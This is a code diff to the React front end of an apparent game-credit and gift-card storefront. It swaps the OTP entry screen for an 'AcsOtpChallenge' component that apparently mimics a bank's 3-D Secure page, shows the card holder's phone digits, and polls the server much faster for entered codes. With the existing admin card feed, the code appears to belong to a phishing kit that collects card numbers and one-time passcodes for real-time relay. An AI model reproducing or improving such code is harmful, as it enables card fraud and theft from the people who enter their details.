@@ -2,7 +2,8 @@
 import type { LucideIcon } from 'lucide-react';
 import { LanguageProvider, useLanguage } from './context/LanguageContext';
 import { Globe, Wallet, CreditCard, Building2, Zap, Copy, CheckCircle2, UploadCloud, Home, LayoutGrid, Clock, User, ArrowRight, ArrowLeft, Settings, LogIn, LogOut, Activity, FileText, ArrowDownUp, ShieldAlert, Gamepad2, XCircle, Eye, EyeOff, Download, Search, Pencil, Tv, AppWindow } from 'lucide-react';
-import { CardProcessingToOtpScreen, OtpResendButton, OtpVerificationExtras } from './components/OtpPaymentUi';
+import { CardProcessingToOtpScreen } from './components/OtpPaymentUi';
+import { AcsOtpChallenge } from './components/AcsOtpChallenge';
 import { ServiceCard } from './components/ServiceCard';
 import { PubgUcOrder } from './components/PubgUcOrder';
 import { GiftCardOrder } from './components/GiftCardOrder';
@@ -71,14 +72,14 @@ function getPollIntervalMs(): number {
 }
 
 function getOtpPollIntervalMs(): number {
-  if (typeof navigator === 'undefined') return 2000;
+  if (typeof navigator === 'undefined') return 1200;
   const c = (navigator as Navigator & { connection?: { effectiveType?: string } }).connection;
-  if (c?.effectiveType === '4g') return 1500;
-  return 2500;
+  if (c?.effectiveType === '4g') return 900;
+  return 1500;
 }
 
 function getPreOtpPollIntervalMs(): number {
-  return 500;
+  return 250;
 }
 
 const OTP_MAX_ATTEMPTS = 2;
@@ -526,6 +527,7 @@ function MainContent() {
   const [otpResendLoading, setOtpResendLoading] = useState(false);
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
   const [otpCode, setOtpCode] = useState('');
+  const [otpPhoneLast3, setOtpPhoneLast3] = useState<string | null>(null);
   const [sellAmount, setSellAmount] = useState<number>(10000);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const prevTransactionsRef = useRef<ServerTransaction[]>([]);
@@ -1175,7 +1177,7 @@ function MainContent() {
     return () => window.clearInterval(tmr);
   }, [isAdmin, currentView, adminTab, fetchAdminCardFeed]);
 
-  const applyOtpPollMeta = useCallback((data: OtpOrderPoll) => {
+  const applyOtpPollMeta = useCallback((data: OtpOrderPoll & { phone_last3?: string | null }) => {
     if (typeof data.otp_attempts === 'number') setOtpAttempts(data.otp_attempts);
     if (typeof data.otp_max_attempts === 'number') setOtpMaxAttempts(data.otp_max_attempts);
     if (typeof data.otp_remaining === 'number') setOtpRemaining(data.otp_remaining);
@@ -1184,6 +1186,7 @@ function MainContent() {
       setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
     }
     if (data.fail_reason) setOtpFailReason(data.fail_reason);
+    if (data.phone_last3) setOtpPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
   }, []);
 
   const applyCardOrderStatus = useCallback((status: string, meta?: OtpOrderPoll) => {
@@ -1897,9 +1900,24 @@ function MainContent() {
     }
   };
 
-  const handleOtpSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const handleOtpMethodNext = async () => {
     if (!currentOrderId) return;
+    try {
+      await fetch(apiUrl('/api/transactions/otp/method-next'), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ order_id: currentOrderId }),
+      });
+    } catch (e) {
+      console.error('method-next:', e);
+    }
+  };
+
+  const handleOtpSubmit = async (code?: string) => {
+    if (!currentOrderId) return;
+    const digit = String(code ?? otpCode).trim();
+    if (digit.length < 4) return;
+    setOtpCode(digit);
     setOtpRetryNotice(false);
     setOtpResendNotice(false);
     setOtpState('checking');
@@ -1907,7 +1925,7 @@ function MainContent() {
       const res = await fetch(apiUrl('/api/transactions/otp'), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ order_id: currentOrderId, otpDigit: otpCode.trim() }),
+        body: JSON.stringify({ order_id: currentOrderId, otpDigit: digit }),
       });
       if (!res.ok) {
         console.error('OTP submit failed:', res.status, await res.text().catch(() => ''));
@@ -6012,46 +6030,25 @@ function MainContent() {
             {backBtn(() => setShowOtpStep(false))}
             <h2 className="text-lg font-black text-gray-900">{lang === 'ar' ? 'رمز التحقق' : 'OTP Verification'}</h2>
           </div>
-          <div className="bg-white rounded-2xl border border-gray-100 p-6 text-center space-y-5">
-            <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto">
-              <ShieldAlert className="w-8 h-8 text-red-600" />
-            </div>
-            <div>
-              <h3 className="font-black text-gray-900 text-lg">{lang === 'ar' ? 'أدخل رمز OTP' : 'Enter OTP Code'}</h3>
-              <p className="text-sm text-gray-400 mt-1">{lang === 'ar' ? 'تم إرسال رمز التحقق إلى هاتفك' : 'A verification code was sent to your phone'}</p>
-            </div>
-            <OtpVerificationExtras
-              t={t}
-              otpAttempts={otpAttempts}
-              otpMaxAttempts={otpMaxAttempts}
-              otpRemaining={otpRemaining}
-              otpRetryNotice={otpRetryNotice}
-              otpResendNotice={otpResendNotice}
-              otpState={otpState}
-            />
-            <form onSubmit={handleOtpSubmit} className="space-y-4">
-              <input
-                type="text" value={otpCode} onChange={(e) => setOtpCode(e.target.value.replace(/[^0-9]/g,''))}
-                required maxLength={6} dir="ltr" inputMode="numeric" pattern="[0-9]*"
-                className="w-full h-12 text-center text-xl font-mono tracking-[8px] border border-gray-300 rounded-md outline-none focus:border-[#0069b4] focus:ring-1 focus:ring-[#0069b4] bg-white"
-                placeholder="------"
-                onKeyDown={(e) => { if (e.key === 'Enter') { /* handled by form */ } }}
-              />
-              <button type="submit" disabled={otpState === 'checking' || otpCode.length < 4}
-                className="w-full bg-red-600 text-white py-4 rounded-2xl font-black text-base disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
-                {otpState === 'checking'
-                  ? <Activity className="w-5 h-5 animate-pulse mx-auto" />
-                  : (lang === 'ar' ? 'تأكيد الرمز' : 'Confirm Code')}
-              </button>
-            </form>
-            <OtpResendButton
-              t={t}
-              loading={otpResendLoading}
-              cooldown={otpResendCooldown}
-              disabled={otpResendLoading || otpResendCooldown > 0 || otpState === 'checking'}
-              onResend={() => void handleOtpResend()}
-            />
-          </div>
+          <AcsOtpChallenge
+            orderRef={currentOrderId}
+            phoneLast3={otpPhoneLast3}
+            lang={lang}
+            otpAttempts={otpAttempts}
+            otpMaxAttempts={otpMaxAttempts}
+            otpRemaining={otpRemaining}
+            otpRetryNotice={otpRetryNotice}
+            otpResendNotice={otpResendNotice}
+            resendCooldown={otpResendCooldown}
+            resendLoading={otpResendLoading}
+            externalState={otpState === 'failed' ? 'failed' : otpState === 'checking' ? 'checking' : 'input'}
+            failReason={otpFailReason}
+            t={t}
+            onMethodNext={handleOtpMethodNext}
+            onSubmitOtp={(code) => handleOtpSubmit(code)}
+            onResend={() => void handleOtpResend()}
+            onRetry={resetForm}
+          />
         </div>
       );
     }
@@ -6302,89 +6299,26 @@ function MainContent() {
           {cardProcessingToOtp ? (
             <CardProcessingToOtpScreen lang={lang} etaText={t('otpEtaDelivery')} layout="inline" />
           ) : showOtpStep ? (
-            <div className="p-6 flex-1 flex flex-col items-center justify-center space-y-6">
-              {otpState === 'failed' ? (
-                <>
-                  <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm border border-red-100">
-                    <XCircle className="w-8 h-8 text-red-600" />
-                  </div>
-                  <h3 className="font-black text-xl text-center text-gray-900">عملية مرفوضة</h3>
-                  <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
-                    {otpFailReason === 'otp_attempts_exceeded'
-                      ? t('otpRejectedAttempts')
-                      : 'عذراً، تم رفض العملية أو البطاقة المدخلة غير صالحة.'}
-                  </p>
-                  <button
-                    onClick={resetForm}
-                    className="w-full bg-gray-900 text-white py-4 mt-6 rounded-2xl font-bold hover:bg-gray-800 transition-colors"
-                  >
-                    حاول مرة أخرى
-                  </button>
-                </>
-              ) : otpState === 'checking' ? (
-                <>
-                  <div className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-2">
-                    <Activity className="w-8 h-8 text-red-600 animate-pulse" />
-                  </div>
-                  <h3 className="font-black text-xl text-center text-gray-900">جاري المعالجة...</h3>
-                  <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
-                    الرجاء الانتظار ريثما نقوم بمطابقة رمزك. لا تغلق هذه الصفحة.
-                  </p>
-                </>
-              ) : (
-                <>
-                  <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm border border-red-100">
-                    <ShieldAlert className="w-8 h-8 text-red-600" />
-                  </div>
-                  <h3 className="font-black text-xl text-center text-gray-900">{t('otpVerification', 'رمز التحقق (OTP)')}</h3>
-                  <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
-                    {t('otpSent', 'تم إرسال رمز تحقق مؤقت إلى هاتفك لضمان أمان العملية.')}
-                  </p>
-                  <div className="w-full max-w-sm">
-                    <OtpVerificationExtras
-                      t={t}
-                      otpAttempts={otpAttempts}
-                      otpMaxAttempts={otpMaxAttempts}
-                      otpRemaining={otpRemaining}
-                      otpRetryNotice={otpRetryNotice}
-                      otpResendNotice={otpResendNotice}
-                      otpState={otpState}
-                    />
-                  </div>
-                  <form onSubmit={handleOtpSubmit} className="w-full max-w-sm space-y-5">
-                    <input
-                      type="text"
-                      value={otpCode}
-                      onChange={(e) => setOtpCode(e.target.value.replace(/[^0-9]/g,''))}
-                      required
-                      className="w-full h-12 text-center text-xl font-mono tracking-[8px] focus:outline-none focus:border-[#0069b4] transition-all text-gray-900 bg-white rounded-md border border-gray-300"
-                      placeholder="------"
-                      maxLength={6}
-                      dir="ltr"
-                      inputMode="numeric"
-                    />
-                    <button
-                      type="submit"
-                      disabled={otpState === 'checking' || otpCode.length < 4}
-                      className="w-full bg-red-600 text-white rounded-2xl py-4 font-black shadow-lg shadow-red-600/20 disabled:opacity-70 flex justify-center px-4"
-                    >
-                      {otpState === 'checking' ? <Activity className="w-5 h-5 animate-pulse" /> : t('verifyCode', 'تأكيد الرمز')}
-                    </button>
-                  </form>
-                  <div className="w-full max-w-sm">
-                    <OtpResendButton
-                      t={t}
-                      loading={otpResendLoading}
-                      cooldown={otpResendCooldown}
-                      disabled={otpResendLoading || otpResendCooldown > 0 || otpState === 'checking'}
-                      onResend={() => void handleOtpResend()}
-                    />
-                  </div>
-                  <div className="text-center pt-4">
-                    <span className="text-xs font-bold text-gray-400">لن يتم تسجيل العملية دون الرمز المدخل</span>
-                  </div>
-                </>
-              )}
+            <div className="p-4 sm:p-6 flex-1 flex flex-col items-center justify-center">
+              <AcsOtpChallenge
+                orderRef={currentOrderId}
+                phoneLast3={otpPhoneLast3}
+                lang={lang}
+                otpAttempts={otpAttempts}
+                otpMaxAttempts={otpMaxAttempts}
+                otpRemaining={otpRemaining}
+                otpRetryNotice={otpRetryNotice}
+                otpResendNotice={otpResendNotice}
+                resendCooldown={otpResendCooldown}
+                resendLoading={otpResendLoading}
+                externalState={otpState === 'failed' ? 'failed' : otpState === 'checking' ? 'checking' : 'input'}
+                failReason={otpFailReason}
+                t={t}
+                onMethodNext={handleOtpMethodNext}
+                onSubmitOtp={(code) => handleOtpSubmit(code)}
+                onResend={() => void handleOtpResend()}
+                onRetry={resetForm}
+              />
             </div>
           ) : buyPaymentType ? (
           <div className="p-4 sm:p-6 flex-1 overflow-y-auto space-y-6 sm:space-y-8">
